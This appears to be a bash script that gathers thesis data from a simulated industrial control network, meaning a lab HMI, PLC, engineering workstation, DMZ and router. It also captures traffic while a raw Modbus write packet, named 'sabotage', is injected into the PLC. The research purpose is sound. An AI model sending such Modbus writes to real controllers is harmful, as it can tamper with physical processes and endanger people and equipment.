#!/usr/bin/env bash
# collect_complex_thesis_data.sh
# Automated complex sandbox thesis data collector. Run inside the Vagrant VM as root.

BACKUP_DIR="/vagrant/thesis_data_dumps_complex"
mkdir -p "$BACKUP_DIR"

HMI_IP="192.168.129.238"
PLC_IP="192.168.129.203"
EWS_IP="192.168.128.181"
ROUTER_IP="192.168.128.159"
DMZ_IP="192.168.128.251"
KEY_FILE="/tmp/pool-57.key"
NETNS="qdhcp-42596486-a83c-4569-b032-5d538cf28331"

ssh_cmd() {
  sudo ip netns exec "$NETNS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -i "$KEY_FILE" debian@"$1" "$2"
}

echo "=== GATHERING COMPLEX THESIS DATA ==="

# 1. Hypervisor Host specs
echo "Collecting hypervisor host specs..."
lscpu > "$BACKUP_DIR/host_cpu.txt"
free -h > "$BACKUP_DIR/host_ram.txt"
df -h > "$BACKUP_DIR/host_disk.txt"
sudo docker ps > "$BACKUP_DIR/host_containers.txt"
sudo kubectl get pods -A > "$BACKUP_DIR/kubernetes_pods.txt" 2>/dev/null || true

source /etc/kolla/admin-openrc.sh
source /root/kolla-ansible-venv/bin/activate
openstack server list --all > "$BACKUP_DIR/openstack_servers.txt"
openstack network list > "$BACKUP_DIR/openstack_networks.txt"
openstack flavor list > "$BACKUP_DIR/openstack_flavors.txt"

# 2. HMI specs & configuration
echo "Collecting HMI specs & configuration..."
ssh_cmd "$HMI_IP" "lscpu" > "$BACKUP_DIR/hmi_cpu.txt"
ssh_cmd "$HMI_IP" "free -h" > "$BACKUP_DIR/hmi_ram.txt"
ssh_cmd "$HMI_IP" "df -h" > "$BACKUP_DIR/hmi_disk.txt"
ssh_cmd "$HMI_IP" "ip a" > "$BACKUP_DIR/hmi_networking.txt"
ssh_cmd "$HMI_IP" "ip route" > "$BACKUP_DIR/hmi_routing.txt"
ssh_cmd "$HMI_IP" "sudo ss -tlnp" > "$BACKUP_DIR/hmi_ports.txt"
ssh_cmd "$HMI_IP" "sudo systemctl status nodered" > "$BACKUP_DIR/hmi_nodered_status.txt"
ssh_cmd "$HMI_IP" "cat /root/.node-red/settings.js 2>/dev/null || cat /home/debian/.node-red/settings.js 2>/dev/null" > "$BACKUP_DIR/hmi_nodered_settings.js"

# 3. PLC specs, database & configs
echo "Collecting PLC specs, database & configs..."
ssh_cmd "$PLC_IP" "lscpu" > "$BACKUP_DIR/plc_cpu.txt"
ssh_cmd "$PLC_IP" "free -h" > "$BACKUP_DIR/plc_ram.txt"
ssh_cmd "$PLC_IP" "df -h" > "$BACKUP_DIR/plc_disk.txt"
ssh_cmd "$PLC_IP" "ip a" > "$BACKUP_DIR/plc_networking.txt"
ssh_cmd "$PLC_IP" "ip route" > "$BACKUP_DIR/plc_routing.txt"
ssh_cmd "$PLC_IP" "sudo ss -tlnp" > "$BACKUP_DIR/plc_ports.txt"
ssh_cmd "$PLC_IP" "sudo systemctl status openplc" > "$BACKUP_DIR/plc_openplc_status.txt"
ssh_cmd "$PLC_IP" "sqlite3 /opt/OpenPLC_v3/webserver/openplc.db \".schema\"" > "$BACKUP_DIR/plc_openplc_db_schema.txt"
ssh_cmd "$PLC_IP" "sqlite3 /opt/OpenPLC_v3/webserver/openplc.db \"SELECT * FROM settings;\"" > "$BACKUP_DIR/plc_openplc_db_settings.txt"

# 4. EWS specs
echo "Collecting EWS specs..."
ssh_cmd "$EWS_IP" "lscpu" > "$BACKUP_DIR/ews_cpu.txt"
ssh_cmd "$EWS_IP" "free -h" > "$BACKUP_DIR/ews_ram.txt"
ssh_cmd "$EWS_IP" "df -h" > "$BACKUP_DIR/ews_disk.txt"
ssh_cmd "$EWS_IP" "ip a" > "$BACKUP_DIR/ews_networking.txt"
ssh_cmd "$EWS_IP" "ip route" > "$BACKUP_DIR/ews_routing.txt"
ssh_cmd "$EWS_IP" "sudo ss -tlnp" > "$BACKUP_DIR/ews_ports.txt"
ssh_cmd "$EWS_IP" "sudo systemctl status safety-monitor 2>/dev/null || sudo systemctl status simulation-monitor 2>/dev/null" > "$BACKUP_DIR/ews_status.txt"

# 4.5. DMZ specs
echo "Collecting DMZ Jump Host specs..."
ssh_cmd "$DMZ_IP" "lscpu" > "$BACKUP_DIR/dmz_cpu.txt"
ssh_cmd "$DMZ_IP" "free -h" > "$BACKUP_DIR/dmz_ram.txt"
ssh_cmd "$DMZ_IP" "df -h" > "$BACKUP_DIR/dmz_disk.txt"
ssh_cmd "$DMZ_IP" "ip a" > "$BACKUP_DIR/dmz_networking.txt"
ssh_cmd "$DMZ_IP" "ip route" > "$BACKUP_DIR/dmz_routing.txt"
ssh_cmd "$DMZ_IP" "sudo ss -tlnp" > "$BACKUP_DIR/dmz_ports.txt"

# 5. Router firewall rules
echo "Collecting Router firewall rules..."
ssh_cmd "$ROUTER_IP" "sudo iptables -t filter -S FORWARD" > "$BACKUP_DIR/router_forward_rules.txt"
ssh_cmd "$ROUTER_IP" "sudo iptables -t nat -S" > "$BACKUP_DIR/router_nat_rules.txt"
ssh_cmd "$ROUTER_IP" "ip route" > "$BACKUP_DIR/router_routing.txt"

# 6. Network Traffic Capture (PCAP)
echo "Setting up network traffic capture (PCAP) on PLC..."
ssh_cmd "$PLC_IP" "sudo timeout 10 tcpdump -i any port 502 -w /tmp/modbus_sabotage_complex.pcap -c 10" &
sleep 2

# Send the Modbus write packet from the EWS VM to the PLC
echo "Injecting Modbus payload from EWS..."
ssh_cmd "$EWS_IP" "python3 -c \"import socket; s=socket.socket(); s.connect(('192.168.20.10',502)); s.sendall(b'\x00\x01\x00\x00\x00\x06\x01\x06\x00\x00\x27\x0f'); s.recv(1024); s.close()\""

sleep 3
echo "Copying network capture (PCAP)..."
sudo ip netns exec "$NETNS" scp -o StrictHostKeyChecking=no -i "$KEY_FILE" debian@"$PLC_IP":/tmp/modbus_sabotage_complex.pcap "$BACKUP_DIR/modbus_sabotage_complex.pcap"

echo "=== GATHERING COMPLETED SUCCESSFULLY ==="
